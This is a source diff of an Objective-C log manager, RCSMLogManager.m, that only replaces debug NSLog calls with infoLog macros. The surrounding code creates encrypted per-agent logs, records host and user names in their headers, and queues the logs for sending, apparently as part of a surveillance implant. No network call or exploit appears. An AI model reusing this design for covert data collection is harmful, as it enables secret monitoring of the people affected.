@@ -18,10 +18,10 @@
 
 #import "RCSMLogManager.h"
 #import "RCSMEncryption.h"
-#import "RCSMCommon.h"
 
-//#define DEBUG
-//#define WRITE_CLEAR_TEXT_LOG
+#import "RCSMLogger.h"
+#import "RCSMDebug.h"
+
 
 static NSLock *gActiveQueueLock;
 static NSLock *gSendQueueLock;
@@ -56,8 +56,8 @@ static RCSMLogManager *sharedLogManager = nil;
                  agentHeader: (NSData *)anAgentHeader
 {
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
-#ifdef DEBUG
-  infoLog(ME, @"");
+#ifdef DEBUG_LOG_MANAGER
+  infoLog(@"");
 #endif
   
   //NSString *hostName = [[NSHost currentHost] name];
@@ -73,8 +73,8 @@ static RCSMLogManager *sharedLogManager = nil;
   
   NSMutableData *logHeader = [[NSMutableData alloc] initWithLength: sizeof(logStruct)];
   
-#ifdef DEBUG
-  NSLog(@"logStruct: %d", sizeof(logStruct));
+#ifdef DEBUG_LOG_MANAGER
+  infoLog(@"logStruct: %d", sizeof(logStruct));
 #endif
   logStruct *logRawHeader = (logStruct *)[logHeader bytes];
   
@@ -105,10 +105,10 @@ static RCSMLogManager *sharedLogManager = nil;
   else
     logRawHeader->additionalDataLength = 0;
 
-#ifdef DEBUG
-  NSLog(@"hiTimestamp: %x", logRawHeader->hiTimestamp);
-  NSLog(@"loTimestamp: %x", logRawHeader->loTimestamp);
-  NSLog(@"logHeader: %@", logHeader);
+#ifdef DEBUG_LOG_MANAGER
+  infoLog(@"hiTimestamp: %x", logRawHeader->hiTimestamp);
+  infoLog(@"loTimestamp: %x", logRawHeader->loTimestamp);
+  infoLog(@"logHeader: %@", logHeader);
 #endif
   
   int headerLength = sizeof(logStruct)
@@ -119,8 +119,8 @@ static RCSMLogManager *sharedLogManager = nil;
   
   int paddedLength = headerLength;
 
-#ifdef DEBUG
-  NSLog(@"unpaddedLength: %d", paddedLength);
+#ifdef DEBUG_LOG_MANAGER
+  infoLog(@"unpaddedLength: %d", paddedLength);
 #endif
   
   if (paddedLength % kCCBlockSizeAES128)
@@ -135,8 +135,8 @@ static RCSMLogManager *sharedLogManager = nil;
       */
     }
   
-#ifdef DEBUG
-  NSLog(@"paddedLength: %d", paddedLength);
+#ifdef DEBUG_LOG_MANAGER
+  infoLog(@"paddedLength: %d", paddedLength);
 #endif
   
   paddedLength += sizeof(int);
@@ -155,20 +155,20 @@ static RCSMLogManager *sharedLogManager = nil;
   //
   headerLength = paddedLength - sizeof(int);
 
-#ifdef DEBUG
-  NSLog(@"headerLength: %d", headerLength);
+#ifdef DEBUG_LOG_MANAGER
+  infoLog(@"headerLength: %d", headerLength);
 #endif
 
   [rawHeader appendData: logHeader];
   [rawHeader appendData: [hostName dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
   [rawHeader appendData: [userName dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
 
-#ifdef DEBUG
-  NSLog(@"logHeader: %@", logHeader);
-  NSLog(@"hostName: %@", hostName);
-  NSLog(@"userName: %@", userName);
-  NSLog(@"rawHeader: %@", rawHeader);
-  NSLog(@"anAgentHeader: %@", anAgentHeader);
+#ifdef DEBUG_LOG_MANAGER
+  infoLog(@"logHeader: %@", logHeader);
+  infoLog(@"hostName: %@", hostName);
+  infoLog(@"userName: %@", userName);
+  infoLog(@"rawHeader: %@", rawHeader);
+  infoLog(@"anAgentHeader: %@", anAgentHeader);
 #endif
 
   [hostName release];
@@ -188,8 +188,8 @@ static RCSMLogManager *sharedLogManager = nil;
                                         length: CC_MD5_DIGEST_LENGTH];
 #endif
   
-#ifdef DEBUG  
-  NSLog(@"rawHeader Size before Encryption: %d", [rawHeader length]);
+#ifdef DEBUG_LOG_MANAGER  
+  infoLog(@"rawHeader Size before Encryption: %d", [rawHeader length]);
 #endif
   CCCryptorStatus result = 0;
   
@@ -202,9 +202,9 @@ static RCSMLogManager *sharedLogManager = nil;
       [header appendBytes: &headerLength length: sizeof(headerLength)];
       [header appendData: rawHeader];
       
-#ifdef DEBUG      
-      NSLog(@"rawHeader Size after Encryption: %d", [rawHeader length]);
-      NSLog(@"headerLength: %x", headerLength);
+#ifdef DEBUG_LOG_MANAGER      
+      infoLog(@"rawHeader Size after Encryption: %d", [rawHeader length]);
+      infoLog(@"headerLength: %x", headerLength);
 #endif DEBUG
       
       
@@ -215,8 +215,8 @@ static RCSMLogManager *sharedLogManager = nil;
     }
   else
     {
-#ifdef DEBUG_ERRORS
-      NSLog(@"Error on encryption: %d", result);
+#ifdef DEBUG_LOG_MANAGER
+      infoLog(@"Error on encryption: %d", result);
 #endif
     }
   
@@ -360,26 +360,26 @@ static RCSMLogManager *sharedLogManager = nil;
     {
       time_t unixTime;
       time(&unixTime);
-#ifdef DEBUG
-      NSLog(@"unixTime: %x", unixTime);
+#ifdef DEBUG_LOG_MANAGER
+      infoLog(@"unixTime: %x", unixTime);
 #endif
       filetime = ((int64_t)unixTime * (int64_t)RATE_DIFF) + (int64_t)EPOCH_DIFF;
-#ifdef DEBUG
-      NSLog(@"TIME: %x", (int64_t)filetime);
+#ifdef DEBUG_LOG_MANAGER
+      infoLog(@"TIME: %x", (int64_t)filetime);
 #endif
       hiPart = (int64_t)filetime >> 32;
       loPart = (int64_t)filetime & 0xFFFFFFFF;
       
-#ifdef DEBUG
-      NSLog(@"hiPart: %x", hiPart);
-      NSLog(@"loPart: %x", loPart);
+#ifdef DEBUG_LOG_MANAGER
+      infoLog(@"hiPart: %x", hiPart);
+      infoLog(@"loPart: %x", loPart);
 #endif
       NSString *logName = [[NSString alloc] initWithFormat: @"LOGF_%.4X_%.8X%.8X.log",
                                                             agentID,
                                                             hiPart,
                                                             loPart];
-#ifdef DEBUG
-      NSLog(@"LogName: %@", logName);
+#ifdef DEBUG_LOG_MANAGER
+      infoLog(@"LogName: %@", logName);
 #endif
       
       encryptedLogName = [NSString stringWithFormat: @"%@/%@",
@@ -392,9 +392,9 @@ static RCSMLogManager *sharedLogManager = nil;
   
   [encryptedLogName retain];
   
-#ifdef DEBUG
-  NSLog(@"Creating log: %@", encryptedLogName);
-  NSLog(@"anAgentHeader: %@", anAgentHeader);
+#ifdef DEBUG_LOG_MANAGER
+  infoLog(@"Creating log: %@", encryptedLogName);
+  infoLog(@"anAgentHeader: %@", anAgentHeader);
 #endif
   
   success = [@"" writeToFile: encryptedLogName
@@ -411,7 +411,7 @@ static RCSMLogManager *sharedLogManager = nil;
   NSString *logPath = [NSString stringWithFormat: @"%@/%@",
                        [[NSBundle mainBundle] bundlePath], logName];
                                               
-  NSLog(@"Creating clear text file: %@", logName);
+  infoLog(@"Creating clear text file: %@", logName);
   
   [@"" writeToFile: logPath
         atomically: NO
@@ -422,11 +422,11 @@ static RCSMLogManager *sharedLogManager = nil;
 
   if (clearTextHandle)
     {
-      NSLog(@"Handle for clear text log acquired correctly");
+      infoLog(@"Handle for clear text log acquired correctly");
     }
   else
     {
-      NSLog(@"An error occurred while obtaining handle for clear text log");
+      infoLog(@"An error occurred while obtaining handle for clear text log");
     }
     
   [logName release];
@@ -438,8 +438,8 @@ static RCSMLogManager *sharedLogManager = nil;
                                      encryptedLogName];
       if (logFileHandle)
         {
-#ifdef DEBUG
-          NSLog(@"LogHandle acquired");
+#ifdef DEBUG_LOG_MANAGER
+          infoLog(@"LogHandle acquired");
 #endif
           NSNumber *agent   = [[NSNumber alloc] initWithUnsignedInt: agentID];
           NSNumber *_logID  = [[NSNumber alloc] initWithUnsignedInt: logID];
@@ -513,8 +513,8 @@ static RCSMLogManager *sharedLogManager = nil;
           [agent release];
           [_logID release];
           
-#ifdef DEBUG
-          NSLog(@"activeQueue from Create: %@", mActiveQueue);
+#ifdef DEBUG_LOG_MANAGER
+          infoLog(@"activeQueue from Create: %@", mActiveQueue);
 #endif
           
           //
@@ -527,8 +527,8 @@ static RCSMLogManager *sharedLogManager = nil;
           
           if (logHeader == nil)
             {
-#ifdef DEBUG
-              NSLog(@"An error occurred while creating log Header");
+#ifdef DEBUG_LOG_MANAGER
+              infoLog(@"An error occurred while creating log Header");
 #endif   
               [agentLog release];
               [outerPool release];
@@ -536,8 +536,8 @@ static RCSMLogManager *sharedLogManager = nil;
               
               return FALSE;
             }
-#ifdef DEBUG
-          NSLog(@"encrypted Header: %@", logHeader);
+#ifdef DEBUG_LOG_MANAGER
+          infoLog(@"encrypted Header: %@", logHeader);
 #endif
           
           if ([self writeDataToLog: logHeader
@@ -556,8 +556,8 @@ static RCSMLogManager *sharedLogManager = nil;
         }
     }
 
-#ifdef DEBUG
-  NSLog(@"An error occurred while creating the log file");
+#ifdef DEBUG_LOG_MANAGER
+  infoLog(@"An error occurred while creating the log file");
 #endif
   
   [encryptedLogName release];
@@ -622,8 +622,8 @@ static RCSMLogManager *sharedLogManager = nil;
   
   if (continueLogging == TRUE)
     {
-#ifdef DEBUG
-      NSLog(@"Recreating agents log");
+#ifdef DEBUG_LOG_MANAGER
+      infoLog(@"Recreating agents log");
 #endif
       for (id agent in tempAgentsConf)
         {
@@ -633,8 +633,8 @@ static RCSMLogManager *sharedLogManager = nil;
             {
               if ([agentHeader isEqualToString: @"NO"])
                 {
-#ifdef DEBUG
-                  NSLog(@"No Agent Header found");
+#ifdef DEBUG_LOG_MANAGER
+                  infoLog(@"No Agent Header found");
 #endif
                   [self createLog: [[agent objectForKey: @"agentID"] intValue]
                       agentHeader: nil
@@ -643,9 +643,9 @@ static RCSMLogManager *sharedLogManager = nil;
             }
           else if ([agentHeader isKindOfClass: [NSData class]])
             {
-#ifdef DEBUG
-              NSLog(@"agentHeader (%@)", [agentHeader class]);
-              NSLog(@"agentHeader = %@", agentHeader);
+#ifdef DEBUG_LOG_MANAGER
+              infoLog(@"agentHeader (%@)", [agentHeader class]);
+              infoLog(@"agentHeader = %@", agentHeader);
 #endif
               
               NSData *_agentHeader = [[NSData alloc] initWithData: [agent objectForKey: @"header"]];
@@ -659,8 +659,8 @@ static RCSMLogManager *sharedLogManager = nil;
         }
     }
   
-#ifdef DEBUG
-  NSLog(@"Logs recreated correctly");
+#ifdef DEBUG_LOG_MANAGER
+  infoLog(@"Logs recreated correctly");
 #endif
   
   [newItems release];
@@ -681,8 +681,8 @@ static RCSMLogManager *sharedLogManager = nil;
       if ([[anObject objectForKey: @"agentID"] unsignedIntValue] == agentID
           && ([[anObject objectForKey: @"logID"] unsignedIntValue] == logID || logID == 0))
         {
-#ifdef DEBUG_VERBOSE_1
-          NSLog(@"Closing Log %@", [anObject objectForKey: @"logName"]);
+#ifdef DEBUG_LOG_MANAGER
+          infoLog(@"Closing Log %@", [anObject objectForKey: @"logName"]);
 #endif
           [[anObject objectForKey: @"handle"] closeFile];
 
@@ -693,9 +693,9 @@ static RCSMLogManager *sharedLogManager = nil;
           //
           // Now put the log in the sendQueue and remove it from the active queue
           //
-#ifdef DEBUG
-          NSLog(@"mSendQueue: %@", mSendQueue);
-          NSLog(@"mActiveQueue: %@", mActiveQueue);
+#ifdef DEBUG_LOG_MANAGER
+          infoLog(@"mSendQueue: %@", mSendQueue);
+          infoLog(@"mActiveQueue: %@", mActiveQueue);
 #endif
           [discardedItem addIndex: index];
           
@@ -708,9 +708,9 @@ static RCSMLogManager *sharedLogManager = nil;
           [gSendQueueLock unlock];
           [gActiveQueueLock unlock];
           
-#ifdef DEBUG
-          NSLog(@"mSendQueue: %@", mSendQueue);
-          NSLog(@"mActiveQueue: %@", mActiveQueue);
+#ifdef DEBUG_LOG_MANAGER
+          infoLog(@"mSendQueue: %@", mSendQueue);
+          infoLog(@"mActiveQueue: %@", mActiveQueue);
 #endif
           return TRUE;
         }
@@ -731,8 +731,8 @@ static RCSMLogManager *sharedLogManager = nil;
     }
   @catch (NSException *e)
     {
-#ifdef DEBUG
-      NSLog(@"%s exception", __FUNCTION__);
+#ifdef DEBUG_LOG_MANAGER
+      infoLog(@"%s exception", __FUNCTION__);
 #endif
     
       return FALSE;
@@ -745,8 +745,8 @@ static RCSMLogManager *sharedLogManager = nil;
               forAgent: (u_int)agentID
              withLogID: (u_int)logID
 {
-#ifdef DEBUG
-  infoLog(ME, @"Saving data for agent (%04x) logID (0x%x)", agentID, logID);
+#ifdef DEBUG_LOG_MANAGER
+  infoLog(@"Saving data for agent (%04x) logID (0x%x)", agentID, logID);
 #endif
   
   BOOL logFound = FALSE;
@@ -796,8 +796,8 @@ static RCSMLogManager *sharedLogManager = nil;
           
           if (result == kCCSuccess)
             {
-#ifdef DEBUG
-              NSLog(@"logData Encrypted correctly");
+#ifdef DEBUG_LOG_MANAGER
+              infoLog(@"logData Encrypted correctly");
 #endif
               
               // Writing the size of the clear text block
@@ -809,8 +809,8 @@ static RCSMLogManager *sharedLogManager = nil;
             }
           else
             {
-#ifdef DEBUG
-              NSLog(@"An error occurred while encrypting log data");
+#ifdef DEBUG_LOG_MANAGER
+              infoLog(@"An error occurred while encrypting log data");
 #endif
             }
         }
@@ -828,8 +828,8 @@ static RCSMLogManager *sharedLogManager = nil;
   //
   if (logFound == FALSE)
     {
-#ifdef DEBUG
-      NSLog(@"Log not found");
+#ifdef DEBUG_LOG_MANAGER
+      infoLog(@"Log not found");
 #endif
       return FALSE;
     }
@@ -840,8 +840,8 @@ static RCSMLogManager *sharedLogManager = nil;
 - (BOOL)removeSendLog: (u_int)agentID
             withLogID: (u_int)logID
 {
-#ifdef DEBUG
-  NSLog(@"Removing Log Entry from the Send queue");
+#ifdef DEBUG_LOG_MANAGER
+  infoLog(@"Removing Log Entry from the Send queue");
 #endif
   
   NSMutableIndexSet *discardedItem = [NSMutableIndexSet indexSet];
